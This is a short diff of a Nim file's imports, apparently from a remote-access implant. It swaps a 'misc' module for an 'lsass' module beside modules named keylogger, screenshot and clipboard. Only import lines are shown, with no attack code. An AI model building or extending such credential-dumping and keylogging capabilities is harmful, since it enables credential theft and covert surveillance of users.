@@ -1,7 +1,7 @@
 # Internal imports
 import ../config
 import ../common
-import utils/[audio, clipboard, clr, helpers, memops, misc, screenshot, keylogger, mutex]
+import utils/[audio, clipboard, clr, helpers, memops, lsass, screenshot, keylogger, mutex]
 # Internal imports
 import std/[tables, nativesockets, json]
 import wAuto/[registry, window]
